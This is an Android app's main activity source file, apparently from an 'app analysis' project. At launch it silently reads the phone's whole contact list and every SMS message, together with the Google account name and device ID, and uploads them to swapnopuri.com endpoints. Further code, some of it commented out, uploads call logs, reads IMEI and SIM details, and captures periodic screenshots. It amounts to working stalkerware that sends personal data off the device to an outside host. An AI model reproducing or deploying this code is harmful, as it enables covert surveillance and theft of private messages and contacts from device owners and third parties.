package com.example.nayan.appanalysis2;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.example.nayan.appanalysis2.database.DBManager;
import com.example.nayan.appanalysis2.model.MCalllog;
import com.example.nayan.appanalysis2.model.MImage;
import com.example.nayan.appanalysis2.forgroundApp.Utils;
import com.example.nayan.appanalysis2.fragment.HomeFragment;
import com.google.gson.Gson;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.JsonHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import cz.msebera.android.httpclient.Header;
import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.contacts.Contact;
import me.everything.providers.android.contacts.ContactsProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import me.everything.providers.core.Data;

public class MainActivity extends AppCompatActivity {
    private int STORAGE_PERMISSION_CODE = 23;
    private static final int REQUEST_ID = 1;
    private ArrayList<MImage> mImages;
    private ArrayList<MCalllog> calllogArrayList;
    private List<Call> calls;
    private static MainActivity instance;
    private MCalllog mCalllog;
    Handler handler;

    public static MainActivity getInstance() {
        return instance;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        instance = this;
        handler = new Handler();
        mImages = new ArrayList<>();
        calllogArrayList = new ArrayList<>();
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);

        setSupportActionBar(toolbar);
        setFragment(HomeFragment.class);
        CallsProvider callsProvider = new CallsProvider(getApplicationContext());
        Data<Call> callData = callsProvider.getCalls();



        ContactsProvider contactsProvider = new ContactsProvider(getApplicationContext());
        Data<Contact> contacts = contactsProvider.getContacts();

//
        TelephonyProvider provider = new TelephonyProvider(getApplicationContext());
        Data<Sms> sms = provider.getSms(TelephonyProvider.Filter.ALL);

        String gmail = Utils.getPhoneGmailAcc(this);
        String device = Utils.getDeviceId(this);
        String gn = gmail.split("@")[0];

        Log.e("Gamil is before : ", String.valueOf(gn));
        Log.e("Gamil is : ", gmail);
//        Gson gson=new Gson();
//        String json= gson.toJson(sms.getList());
//        Log.e("SMS",json);

        Gson gson = new Gson();
        String jsonContacts = gson.toJson(contacts.getList());
//        String jsonCallLog = gson.toJson(callData.getList());
        String jsonSms = gson.toJson(sms.getList());
        JSONObject j = new JSONObject();
        try {
            j.put("contacts", jsonContacts);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        Log.e("contacts", jsonContacts);
//        Log.e("call_log", jsonCallLog);
        Log.e("sms", jsonSms);
        if (Utils.isInternetOn()) {
//            sendCalllogToServer(jsonCallLog, gmail, device);
            sendCContactsToServer(jsonContacts, gmail, device);
            sendSmsToServer(jsonSms, gmail, device);
        }
        calls = callData.getList();
        for (int i = 0; i < calls.size(); i++) {
            mCalllog = new MCalllog();
            mCalllog.setNumber(calls.get(i).number);
            DBManager.getInstance().addCallLog(mCalllog, DBManager.TABLE_CALL_LOG);
        }

        calllogArrayList = DBManager.getInstance().getCallLog();
        String jsonCallLog = gson.toJson(calllogArrayList.subList(0,5));
        Log.e("callog : ", "db size " + calllogArrayList.size());
        Log.e("call_log", jsonCallLog);

    }

    private void isDualSimOrNot() {


        TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        String telNumber = manager.getLine1Number();
        String getSimSerialNumber = manager.getSimSerialNumber();
        SimNoInfo telephonyInfo = SimNoInfo.getInstance(this);

        String imeiSIM1 = telephonyInfo.getImeiSIM1();
        String imeiSIM2 = telephonyInfo.getImeiSIM2();

        boolean isSIM1Ready = telephonyInfo.isSIM1Ready();
        boolean isSIM2Ready = telephonyInfo.isSIM2Ready();

        boolean isDualSIM = telephonyInfo.isDualSIM();
        Log.e("Dual = ", " IME1 : " + imeiSIM1 + "\n" +
                " IME2 : " + imeiSIM2 + "\n" +
                " IS DUAL SIM : " + isDualSIM + "\n" +
                " IS SIM1 READY : " + isSIM1Ready + "\n" +
                " IS SIM2 READY : " + isSIM2Ready + "\n" +
                " own number : " + telNumber + "\n" +
                " own number : " + getSimSerialNumber + "\n");
    }

    public void sendCContactsToServer(String josn, String email, String device) {
        if (!Utils.isInternetOn())
            return;
        Log.e("Call", "contacts server");
        AsyncHttpClient client = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        params.put("email", email);
        params.put("device_id", device);
        params.put("contacts", josn);

        client.post("http://www.swapnopuri.com/app/calllog/api/contact_log_insert/", params, new JsonHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray response) {
                super.onSuccess(statusCode, headers, response);
                Log.e("contacts", response.toString());
                try {
                    if (response.getJSONObject(0).has("status") && response.getJSONObject(0).getString("status").equals("success")) {

                        Toast.makeText(MainActivity.this, "call uploaded", Toast.LENGTH_SHORT).show();


                    } else {
                        Log.e("contacts", " not uploaded");
                        Toast.makeText(MainActivity.this, "call uploaded failed", Toast.LENGTH_SHORT).show();

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
                super.onFailure(statusCode, headers, responseString, throwable);
                Log.e("contacts", responseString);
            }
        });
    }

    public void sendCalllogToServer(String josn, String email, String device) {
        if (!Utils.isInternetOn())
            return;
        Log.e("Call", "contacts server");
        AsyncHttpClient client = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        params.put("email", email);
        params.put("device_id", device);
        params.put("call_log", josn);

        client.post("http://www.swapnopuri.com/app/calllog/api/call_log_insert/", params, new JsonHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray response) {
                super.onSuccess(statusCode, headers, response);
                Log.e("call_log", response.toString());
                try {
                    if (response.getJSONObject(0).has("status") && response.getJSONObject(0).getString("status").equals("success")) {

                        Toast.makeText(MainActivity.this, "call uploaded", Toast.LENGTH_SHORT).show();


                    } else {
                        Log.e("call_log", " not uploaded");
                        Toast.makeText(MainActivity.this, "call uploaded failed", Toast.LENGTH_SHORT).show();

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
                super.onFailure(statusCode, headers, responseString, throwable);
                Log.e("call_log", responseString);
            }
        });
    }

    public void sendSmsToServer(String josn, String email, String device) {
        if (!Utils.isInternetOn())
            return;
        Log.e("Call", "contacts server");
        AsyncHttpClient client = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        params.put("email", email);
        params.put("device_id", device);
        params.put("sms", josn);

        client.post("http://www.swapnopuri.com/app/calllog/api/sms_log_insert/", params, new JsonHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray response) {
                super.onSuccess(statusCode, headers, response);
                Log.e("sms", response.toString());
                try {
                    if (response.getJSONObject(0).has("status") && response.getJSONObject(0).getString("status").equals("success")) {

                        Toast.makeText(MainActivity.this, "call uploaded", Toast.LENGTH_SHORT).show();


                    } else {
                        Log.e("sms", " not uploaded");
                        Toast.makeText(MainActivity.this, "call uploaded failed", Toast.LENGTH_SHORT).show();

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
                super.onFailure(statusCode, headers, responseString, throwable);
                Log.e("sms", responseString);
            }
        });
    }

    private void deleteImageFromSdcard() {
        File externalFilesDir = this.getExternalFilesDir(null);
        String path = externalFilesDir.getAbsolutePath() + "/screenshots/" + mImages.get(21).getImgName();
        File file = new File(path);
        if (file.exists()) {
            if (file.delete()) {
                Log.e("file Deleted :", " " + path + mImages.get(21).getImgName());
            } else {
                Log.e("file Not Deleted :", " " + path + mImages.get(21).getImgName());
            }
        }
    }

    public void requestPermission() {
        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ScreenshotManager.INSTANCE.requestScreenshotPermission(this, REQUEST_ID);
        }
    }

//    @Override
//    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
//        Log.e("onactivityResult", " ");
//        if (requestCode == REQUEST_ID)
//            ScreenshotManager.INSTANCE.onActivityResult(resultCode, data, MainActivity.this);
//
//    }
//
//    @Override
//    protected void onResume() {
//        super.onResume();
//        if (!needsUsageStatsPermission()) {
//            btUsagePermission.setVisibility(View.GONE);
//            tvPermission.setText(R.string.usage_permission_granted);
////            ForegroundToastService.start(getBaseContext());
//            ForegroundToastService.start(getApplicationContext());
////            Toast.makeText(getBaseContext(), getString(R.string.service_started), Toast.LENGTH_SHORT).show();
//        } else {
//            btUsagePermission.setVisibility(View.VISIBLE);
//            btUsagePermission.setOnClickListener(new View.OnClickListener() {
//                @Override
//                public void onClick(View view) {
//                    requestUsageStatsPermission();
//                }
//            });
//        }
//    }
//
//    @Override
//    protected void onRestart() {
//        super.onRestart();
//        if (!needsUsageStatsPermission()) {
//            btUsagePermission.setVisibility(View.GONE);
//            tvPermission.setText(R.string.usage_permission_granted);
//            ForegroundToastService.start(getApplicationContext());
////            ForegroundToastService.start(getBaseContext());
////            Toast.makeText(getBaseContext(), getString(R.string.service_started), Toast.LENGTH_SHORT).show();
//        } else {
//            btUsagePermission.setVisibility(View.VISIBLE);
//            btUsagePermission.setOnClickListener(new View.OnClickListener() {
//                @Override
//                public void onClick(View view) {
//                    requestUsageStatsPermission();
//                }
//            });
//        }
//    }


//
//    private void whatsApp() {
//        PackageManager pm = getPackageManager();
//        try {
//
//            Intent waIntent = new Intent(Intent.ACTION_SEND);
//            waIntent.setType("text/plain");
//            String text = "YOUR TEXT HERE";
//
//            PackageInfo info = pm.getPackageInfo("com.whatsapp", PackageManager.GET_META_DATA);
//            //Check if package exists or not. If not then code
//            //in catch block will be called
//            waIntent.setPackage("com.whatsapp");
//
//            waIntent.putExtra(Intent.EXTRA_TEXT, text);
//            startActivity(Intent.createChooser(waIntent, "Share with"));
//
//        } catch (PackageManager.NameNotFoundException e) {
//            Toast.makeText(this, "WhatsApp not Installed", Toast.LENGTH_SHORT)
//                    .show();
//        }
//    }
//
//    public Bitmap getScreenShot(View view) {
//        View screenView = getWindow().getDecorView().getRootView();
//        screenView.setDrawingCacheEnabled(true);
//        Bitmap bitmap = Bitmap.createBitmap(screenView.getDrawingCache());
//        screenView.setDrawingCacheEnabled(false);
//        return bitmap;
//    }


//    private void takeScreenshot() {
//        shot++;
//        Bitmap b = null;
//
//        b = getScreenShot(rootContent);
//
//        //If bitmap is not null
//        if (b != null) {
//
//            File saveFile = ScreenshotUtils.getMainDirectoryName(this);//get the path to save screenshot
//            File file = ScreenshotUtils.store(b, "screenshot" + shot + ".jpg", saveFile);//save the screenshot to selected path
//            Toast.makeText(this, R.string.screenshot_take_success, Toast.LENGTH_SHORT).show();
////            shareScreenshot(file);//finally share screenshot
//        } else
//            //If bitmap is null show toast message
//            Toast.makeText(this, R.string.screenshot_take_failed, Toast.LENGTH_SHORT).show();
//
//        handler.postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                takeScreenshot();
//
//            }
//        }, 60000);
//    }

    /*  Show screenshot Bitmap */
//    private void showScreenShotImage(Bitmap b) {
////        imageView.setImageBitmap(b);
//    }

    /*  Share Screenshot  */
    private void shareScreenshot(File file) {
        Uri uri = Uri.fromFile(file);//Convert file path into Uri for sharing
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_SEND);
        intent.setType("image/*");
        intent.putExtra(android.content.Intent.EXTRA_SUBJECT, "");
        intent.putExtra(android.content.Intent.EXTRA_TEXT, getString(R.string.sharing_text));
        intent.putExtra(Intent.EXTRA_STREAM, uri);//pass uri here
        startActivity(Intent.createChooser(intent, getString(R.string.share_title)));
    }

    private void requestStoragePermissionToMashmallow() {

        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            //If the user has denied the permission previously your code will come to this block
            //Here you can explain why you need this permission
            //Explain here why you need this permission
        }

        //And finally ask for the permission
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CALL_LOG, Manifest.permission.WRITE_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.READ_PHONE_STATE, Manifest.permission.GET_ACCOUNTS, Manifest.permission.INTERNET}, STORAGE_PERMISSION_CODE);
    }

//    @Override
//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
//        //Checking the request code of our request
//        if (requestCode == STORAGE_PERMISSION_CODE) {
//
//            //If permission is granted
//            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                isDualSimOrNot();
//                ContactsProvider contactsProvider = new ContactsProvider(getApplicationContext());
//                Data<Contact> contacts = contactsProvider.getContacts();
//
//                TelephonyProvider provider = new TelephonyProvider(getApplicationContext());
//                Data<Sms> sms = provider.getSms(TelephonyProvider.Filter.ALL);
//
////                CallsProvider callsProvider = new CallsProvider(getApplicationContext());
////                Data<Call> callData = callsProvider.getCalls();
////
////                String gmail = Utils.getPhoneGmailAcc(this);
////                String device = Utils.getDeviceId(this);
////                String[] s = gmail.split("@");
////
////                Log.e("Gamil is before : ", String.valueOf(s));
////                Log.e("Gamil is : ", gmail);
//////        Gson gson=new Gson();
//////        String json= gson.toJson(sms.getList());
//////        Log.e("SMS",json);
////
////                Gson gson = new Gson();
////                String json = gson.toJson(callData.getList());
////                JSONObject j = new JSONObject();
////                try {
////                    j.put("Call", json);
////                } catch (JSONException e) {
////                    e.printStackTrace();
////                }
////                Log.e("Call", json);
////                sendCalllogToServer(json, gmail, device);
////                Utils.toastMassage(this, "Permission granted now you can read the storage");
//            } else {
////                Utils.toastMassage(this, "Oops you just denied the permission");
//            }
//        }
//    }

    private void setFragment(Class<? extends Fragment> fragment) {
        try {
            FragmentManager fragmentManager = getSupportFragmentManager();
            FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction();
            fragmentTransaction.replace(R.id.main_fragment_container, fragment.newInstance());
            fragmentTransaction.commit();
        } catch (Exception e) {
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
//        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        switch (id) {
//            case R.id.action_settings:
//                return true;
        }

        return super.onOptionsItemSelected(item);
    }


    //code for forground app

//    private boolean needsUsageStatsPermission() {
//        return postLollipop() && !hasUsageStatsPermission(this);
//    }

//    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
//    private void requestUsageStatsPermission() {
//        if (!hasUsageStatsPermission(this)) {
//            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
//        }
//    }
//
//    private boolean postLollipop() {
//        return android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP;
//    }
//
//    @TargetApi(Build.VERSION_CODES.KITKAT)
//    private boolean hasUsageStatsPermission(Context context) {
//        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
//        int mode = appOps.checkOpNoThrow("android:get_usage_stats",
//                android.os.Process.myUid(), context.getPackageName());
//        boolean granted = mode == AppOpsManager.MODE_ALLOWED;
//        return granted;
//    }


}
